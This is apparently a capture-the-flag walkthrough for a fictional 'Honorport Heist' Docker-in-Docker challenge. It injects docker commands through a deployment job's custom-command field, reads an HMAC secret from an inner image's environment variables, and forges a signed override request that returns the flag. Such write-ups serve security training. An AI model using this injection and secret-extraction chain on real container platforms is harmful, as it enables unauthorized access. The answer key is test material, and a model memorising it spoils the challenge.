# Detailed Solution Walkthrough: XO-9 (Honorport Heist - Docker in Docker)

## Step 1: Reconnaissance
Navigate to `http://<TARGET>:8080` or connect to the SSH Gateway (`ssh honorport@<TARGET> -p 22`).
Observe the Honorport Logistics Console interface for triggering container deployment jobs.

## Step 2: Inner Docker Daemon Enumeration
Trigger a deployment with a custom command hook:
```json
{
  "manifest": "honorport/cargo-manifest-standard",
  "custom_command": "docker images"
}
```
The response reveals inner Docker images:
- `honorport-registry.local:5000/system/base-os:v1.0.0`
- `honorport-registry.local:5000/defense/vault-gatekeeper:v3.2.1`
- `honorport-registry.local:5000/internal/harbor-master-signer:v2.0.0`

## Step 3: Secret Extraction from Inner Docker Image
Inspect the `harbor-master-signer` image metadata:
```json
{
  "manifest": "honorport/cargo-manifest-standard",
  "custom_command": "docker inspect honorport-registry.local:5000/internal/harbor-master-signer:v2.0.0"
}
```
In the image config environment variables, find:
- `HARBOR_MASTER_ID=HONORPORT-HARBOR-MASTER-09`
- `VAULT_HMAC_SECRET_KEY=honorport_vault_sig_7749102837194821`

## Step 4: Signature Generation & Mainframe Vault Unlock
Construct an HMAC-SHA256 signature for message `HONORPORT-HARBOR-MASTER-09:<timestamp>` using the secret key `honorport_vault_sig_7749102837194821`.

Submit the override payload to `/api/production/override`:
```json
{
  "harbor_master_id": "HONORPORT-HARBOR-MASTER-09",
  "timestamp": "1727337600",
  "signature": "<calculated_hmac_hex>"
}
```

Response:
```json
{
  "status": "SUCCESS",
  "message": "Honorport High-Security Vault Override Authorized.",
  "flag": "YUVA{d1nd_h0n0rp0rt_h31st_d0ck3r_1n_d0ck3r_x09}"
}
```
